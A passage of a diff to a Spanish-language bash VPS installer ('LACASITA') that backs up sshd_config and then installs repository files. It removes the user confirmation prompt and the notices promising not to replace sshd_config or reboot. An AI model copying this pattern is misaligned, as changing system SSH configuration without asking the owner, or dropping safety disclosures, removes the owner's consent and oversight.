+    cp -a /etc/ssh/sshd_config "/etc/ssh/sshd_config.backup.$(date +%Y%m%d-%H%M%S)" 2>/dev/null || true
+
+    install_repo_files
 
     echo
     echo "=============================================="
-    echo " LACASITA VPS - INSTALADOR SIN KEY"
+    echo " LACASITA - INSTALADOR SIN KEY"
     echo "=============================================="
-    echo " Repositorio:"
-    echo " $GITHUB_RAW_BASE"
-    echo
-    echo " Este instalador:"
-    echo "  - No solicita KEY"
-    echo "  - No valida la IP con terceros"
-    echo "  - No envia IP/KEY a Telegram"
-    echo "  - No usa Dropbox"
-    echo "  - NO reemplaza /etc/ssh/sshd_config"
-    echo "  - NO reinicia la VPS automáticamente"
-    echo "=============================================="
-    echo
-
-    read -r -p "¿Continuar con la instalación? [s/N]: " answer
-    [[ "$answer" =~ ^[sS]$ ]] || { echo "Cancelado."; exit 0; }
-
-    backup_ssh
-    install_packages
-    setup_directories
-    install_repo_components
-    create_basic_menu
-    configure_apache
-    configure_firewall
-    write_install_info
-
-    echo
-    echo "=============================================="
-    echo " INSTALACIÓN TERMINADA"
-    echo "=============================================="
-    echo "Menú: menu"
-    echo "Directorio: $INSTALL_DIR"
-    echo
-    echo "No se reinició la VPS."
-    echo "Antes de reiniciar, comprueba SSH con:"
-    echo "  sshd -t"
+    echo " Repositorio: ${GITHUB_RAW_BASE}"
+    echo " No solicita KEY."
+    echo " No envia IP/KEY a Telegram."
+    echo " Menu: menu"
     echo "=============================================="
 }
 
